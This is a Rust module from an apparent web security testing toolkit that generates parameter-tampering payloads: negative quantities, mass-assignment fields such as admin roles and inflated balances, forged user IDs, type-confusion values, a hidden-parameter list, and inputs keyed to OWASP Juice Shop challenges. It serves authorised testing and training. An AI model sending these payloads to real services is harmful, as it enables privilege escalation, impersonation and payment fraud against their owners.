//! Parameter tampering utilities
//!
//! Tools for testing parameter manipulation vulnerabilities including:
//! - Mass assignment
//! - Negative value injection
//! - Type confusion
//! - Hidden parameter discovery

use serde_json::{json, Value};

/// Parameter tampering test case
#[derive(Debug, Clone)]
pub struct TamperTest {
    pub name: String,
    pub description: String,
    pub original: Value,
    pub tampered: Value,
    pub category: TamperCategory,
}

#[derive(Debug, Clone, PartialEq)]
pub enum TamperCategory {
    NegativeValue,
    MassAssignment,
    TypeConfusion,
    BoundaryValue,
    HiddenParameter,
    PrivilegeEscalation,
}

impl TamperTest {
    pub fn new(
        name: impl Into<String>,
        description: impl Into<String>,
        original: Value,
        tampered: Value,
        category: TamperCategory,
    ) -> Self {
        Self {
            name: name.into(),
            description: description.into(),
            original,
            tampered,
            category,
        }
    }
}

/// Generate negative value test cases for numeric fields
///
/// # Example
///
/// ```rust
/// use web_security_toolkit::param_tampering::negative_value_tests;
/// use serde_json::json;
///
/// let tests = negative_value_tests("quantity", 1);
/// assert!(tests.iter().any(|t| t.tampered["quantity"] == -1));
/// ```
pub fn negative_value_tests(field: &str, original_value: i64) -> Vec<TamperTest> {
    vec![
        TamperTest::new(
            "Negative value",
            "Set field to negative value",
            json!({ field: original_value }),
            json!({ field: -1 }),
            TamperCategory::NegativeValue,
        ),
        TamperTest::new(
            "Large negative",
            "Set field to large negative value",
            json!({ field: original_value }),
            json!({ field: -9999 }),
            TamperCategory::NegativeValue,
        ),
        TamperTest::new(
            "Zero value",
            "Set field to zero",
            json!({ field: original_value }),
            json!({ field: 0 }),
            TamperCategory::BoundaryValue,
        ),
        TamperTest::new(
            "Max integer",
            "Set field to max integer",
            json!({ field: original_value }),
            json!({ field: i64::MAX }),
            TamperCategory::BoundaryValue,
        ),
        TamperTest::new(
            "Min integer",
            "Set field to min integer",
            json!({ field: original_value }),
            json!({ field: i64::MIN }),
            TamperCategory::BoundaryValue,
        ),
        TamperTest::new(
            "Float value",
            "Set field to float (type confusion)",
            json!({ field: original_value }),
            json!({ field: -0.01 }),
            TamperCategory::TypeConfusion,
        ),
        TamperTest::new(
            "String numeric",
            "Set field to string representation",
            json!({ field: original_value }),
            json!({ field: "-100" }),
            TamperCategory::TypeConfusion,
        ),
    ]
}

/// Generate mass assignment test cases
///
/// # Example
///
/// ```rust
/// use web_security_toolkit::param_tampering::mass_assignment_tests;
/// use serde_json::json;
///
/// let base = json!({"email": "user@test.com"});
/// let tests = mass_assignment_tests(&base);
/// assert!(tests.iter().any(|t| t.tampered.get("role").is_some()));
/// ```
pub fn mass_assignment_tests(base_object: &Value) -> Vec<TamperTest> {
    let base = base_object.clone();

    vec![
        TamperTest::new(
            "Add admin role",
            "Add role field with admin value",
            base.clone(),
            merge_json(&base, &json!({"role": "admin"})),
            TamperCategory::MassAssignment,
        ),
        TamperTest::new(
            "Add isAdmin flag",
            "Add isAdmin boolean field",
            base.clone(),
            merge_json(&base, &json!({"isAdmin": true})),
            TamperCategory::MassAssignment,
        ),
        TamperTest::new(
            "Add admin flag",
            "Add admin boolean field",
            base.clone(),
            merge_json(&base, &json!({"admin": true})),
            TamperCategory::MassAssignment,
        ),
        TamperTest::new(
            "Add privilege level",
            "Add privilege field with high value",
            base.clone(),
            merge_json(&base, &json!({"privilege": 9999})),
            TamperCategory::MassAssignment,
        ),
        TamperTest::new(
            "Add user type",
            "Add userType field with admin",
            base.clone(),
            merge_json(&base, &json!({"userType": "admin"})),
            TamperCategory::MassAssignment,
        ),
        TamperTest::new(
            "Add permissions",
            "Add permissions array",
            base.clone(),
            merge_json(&base, &json!({"permissions": ["admin", "write", "delete"]})),
            TamperCategory::MassAssignment,
        ),
        TamperTest::new(
            "Add verified flag",
            "Add verified/emailVerified flag",
            base.clone(),
            merge_json(&base, &json!({"verified": true, "emailVerified": true})),
            TamperCategory::MassAssignment,
        ),
        TamperTest::new(
            "Add balance",
            "Add balance/credits field",
            base.clone(),
            merge_json(&base, &json!({"balance": 999999, "credits": 999999})),
            TamperCategory::MassAssignment,
        ),
        TamperTest::new(
            "Modify price",
            "Add/modify price field",
            base.clone(),
            merge_json(&base, &json!({"price": 0.01, "total": 0})),
            TamperCategory::MassAssignment,
        ),
        TamperTest::new(
            "Add discount",
            "Add discount field",
            base.clone(),
            merge_json(&base, &json!({"discount": 100, "couponApplied": true})),
            TamperCategory::MassAssignment,
        ),
    ]
}

/// Generate privilege escalation test cases
pub fn privilege_escalation_tests(base_object: &Value, target_user_id: i64) -> Vec<TamperTest> {
    let base = base_object.clone();

    vec![
        TamperTest::new(
            "Change user ID",
            "Modify userId to target another user",
            base.clone(),
            merge_json(&base, &json!({"userId": target_user_id})),
            TamperCategory::PrivilegeEscalation,
        ),
        TamperTest::new(
            "Change user ID (underscore)",
            "Modify user_id to target another user",
            base.clone(),
            merge_json(&base, &json!({"user_id": target_user_id})),
            TamperCategory::PrivilegeEscalation,
        ),
        TamperTest::new(
            "Change UserId (camelCase)",
            "Modify UserId to target another user",
            base.clone(),
            merge_json(&base, &json!({"UserId": target_user_id})),
            TamperCategory::PrivilegeEscalation,
        ),
        TamperTest::new(
            "Change author",
            "Modify author field",
            base.clone(),
            merge_json(&base, &json!({"author": "admin@example.com"})),
            TamperCategory::PrivilegeEscalation,
        ),
        TamperTest::new(
            "Change owner",
            "Modify owner field",
            base.clone(),
            merge_json(&base, &json!({"owner": target_user_id})),
            TamperCategory::PrivilegeEscalation,
        ),
    ]
}

/// Generate type confusion test cases
pub fn type_confusion_tests(field: &str, original_value: &Value) -> Vec<TamperTest> {
    vec![
        TamperTest::new(
            "String to array",
            "Convert string field to array",
            json!({ field: original_value }),
            json!({ field: [original_value] }),
            TamperCategory::TypeConfusion,
        ),
        TamperTest::new(
            "String to object",
            "Convert field to object",
            json!({ field: original_value }),
            json!({ field: {"value": original_value} }),
            TamperCategory::TypeConfusion,
        ),
        TamperTest::new(
            "To null",
            "Set field to null",
            json!({ field: original_value }),
            json!({ field: Value::Null }),
            TamperCategory::TypeConfusion,
        ),
        TamperTest::new(
            "To boolean true",
            "Set field to boolean true",
            json!({ field: original_value }),
            json!({ field: true }),
            TamperCategory::TypeConfusion,
        ),
        TamperTest::new(
            "To boolean false",
            "Set field to boolean false",
            json!({ field: original_value }),
            json!({ field: false }),
            TamperCategory::TypeConfusion,
        ),
        TamperTest::new(
            "To empty string",
            "Set field to empty string",
            json!({ field: original_value }),
            json!({ field: "" }),
            TamperCategory::TypeConfusion,
        ),
        TamperTest::new(
            "To empty array",
            "Set field to empty array",
            json!({ field: original_value }),
            json!({ field: [] }),
            TamperCategory::TypeConfusion,
        ),
        TamperTest::new(
            "To empty object",
            "Set field to empty object",
            json!({ field: original_value }),
            json!({ field: {} }),
            TamperCategory::TypeConfusion,
        ),
    ]
}

/// Common hidden parameters to test
pub fn hidden_parameters() -> Vec<(&'static str, Value)> {
    vec![
        ("admin", json!(true)),
        ("isAdmin", json!(true)),
        ("role", json!("admin")),
        ("roles", json!(["admin"])),
        ("privilege", json!(9999)),
        ("level", json!(99)),
        ("verified", json!(true)),
        ("active", json!(true)),
        ("approved", json!(true)),
        ("debug", json!(true)),
        ("test", json!(true)),
        ("internal", json!(true)),
        ("discount", json!(100)),
        ("free", json!(true)),
        ("bypass", json!(true)),
        ("skip", json!(true)),
        ("skipValidation", json!(true)),
        ("noCheck", json!(true)),
        ("trusted", json!(true)),
    ]
}

/// Juice Shop specific parameter tampering tests
pub fn juice_shop_tampering_tests() -> Vec<TamperTest> {
    vec![
        // Payback Time challenge
        TamperTest::new(
            "Negative quantity (Payback Time)",
            "Set quantity to negative value to get money",
            json!({"quantity": 1}),
            json!({"quantity": -100}),
            TamperCategory::NegativeValue,
        ),
        // Admin Registration
        TamperTest::new(
            "Admin role (Admin Registration)",
            "Add role field during registration",
            json!({"email": "test@test.com", "password": "test123"}),
            json!({"email": "test@test.com", "password": "test123", "role": "admin"}),
            TamperCategory::MassAssignment,
        ),
        // Forged Feedback
        TamperTest::new(
            "Forged UserId (Forged Feedback)",
            "Change UserId to another user",
            json!({"comment": "test", "rating": 5}),
            json!({"comment": "test", "rating": 5, "UserId": 1}),
            TamperCategory::PrivilegeEscalation,
        ),
        // Forged Review
        TamperTest::new(
            "Forged author (Forged Review)",
            "Change author to another user",
            json!({"message": "Great!"}),
            json!({"message": "Great!", "author": "admin@juice-sh.op"}),
            TamperCategory::PrivilegeEscalation,
        ),
        // Deluxe Fraud
        TamperTest::new(
            "Free deluxe (Deluxe Fraud)",
            "Set paymentMode to bypass payment",
            json!({}),
            json!({"paymentMode": "none"}),
            TamperCategory::MassAssignment,
        ),
        // Zero Stars
        TamperTest::new(
            "Zero rating (Zero Stars)",
            "Set rating to zero",
            json!({"comment": "test", "rating": 1}),
            json!({"comment": "test", "rating": 0}),
            TamperCategory::BoundaryValue,
        ),
    ]
}

/// Merge two JSON objects
fn merge_json(base: &Value, additions: &Value) -> Value {
    let mut result = base.clone();
    if let (Some(base_obj), Some(add_obj)) = (result.as_object_mut(), additions.as_object()) {
        for (key, value) in add_obj {
            base_obj.insert(key.clone(), value.clone());
        }
    }
    result
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_negative_value_tests() {
        let tests = negative_value_tests("quantity", 1);
        assert!(!tests.is_empty());
        assert!(tests.iter().any(|t| t.tampered["quantity"] == -1));
    }

    #[test]
    fn test_mass_assignment_tests() {
        let base = json!({"email": "user@test.com"});
        let tests = mass_assignment_tests(&base);
        assert!(!tests.is_empty());
        assert!(tests.iter().any(|t| t.tampered.get("role").is_some()));
    }

    #[test]
    fn test_privilege_escalation() {
        let base = json!({"data": "test"});
        let tests = privilege_escalation_tests(&base, 1);
        assert!(tests.iter().any(|t| t.tampered.get("userId").is_some()));
    }

    #[test]
    fn test_type_confusion() {
        let tests = type_confusion_tests("field", &json!("value"));
        assert!(tests.iter().any(|t| t.tampered["field"].is_null()));
    }

    #[test]
    fn test_juice_shop_tampering() {
        let tests = juice_shop_tampering_tests();
        assert!(tests.iter().any(|t| t.name.contains("Payback")));
        assert!(tests.iter().any(|t| t.name.contains("Admin Registration")));
    }
}
